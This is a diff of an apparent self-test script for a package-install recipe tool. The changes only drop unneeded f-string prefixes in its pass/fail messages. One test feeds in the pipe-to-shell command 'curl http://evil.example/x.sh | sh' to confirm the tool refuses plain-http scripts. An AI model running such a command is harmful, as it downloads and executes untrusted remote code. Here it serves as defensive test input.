@@ -487,19 +487,19 @@ if __name__ == "__main__":
     try:
         fill_recipe("apt_package")
         failed += 1
-        print(f"  ✗ missing param accepted")
+        print("  ✗ missing param accepted")
     except RecipeError:
         passed += 1
-        print(f"  ✓ missing param rejected")
+        print("  ✓ missing param rejected")
 
     # Unknown recipe
     try:
         fill_recipe("reticulate_splines")
         failed += 1
-        print(f"  ✗ unknown recipe accepted")
+        print("  ✗ unknown recipe accepted")
     except RecipeError:
         passed += 1
-        print(f"  ✓ unknown recipe rejected")
+        print("  ✓ unknown recipe rejected")
 
     # Natural-language matcher
     nl_cases = [
@@ -531,7 +531,7 @@ if __name__ == "__main__":
     m = match_simple("what's the weather today?")
     if m is None:
         passed += 1
-        print(f"  ✓ nl miss: non-install text returns None")
+        print("  ✓ nl miss: non-install text returns None")
     else:
         failed += 1
         print(f"  ✗ nl miss: spurious match {m}")
@@ -549,7 +549,7 @@ if __name__ == "__main__":
     assert "sh.rustup.rs" in steps[0].cmd
     assert "/tmp/rustup" in steps[0].cmd or "/tmp/" in steps[0].cmd
     passed += 1
-    print(f"  ✓ curl|sh decomposed into 3 steps")
+    print("  ✓ curl|sh decomposed into 3 steps")
     print(f"    1. {steps[0].cmd}")
     print(f"    2. {steps[1].cmd}")
     print(f"    3. {steps[2].cmd}")
@@ -558,7 +558,7 @@ if __name__ == "__main__":
     bad = decompose_curl_sh("curl http://evil.example/x.sh | sh")
     assert bad is None
     passed += 1
-    print(f"  ✓ curl|sh refuses http://")
+    print("  ✓ curl|sh refuses http://")
 
     # Full end-to-end: NL → recipe → fill → cmd
     m = match_simple("install htop")
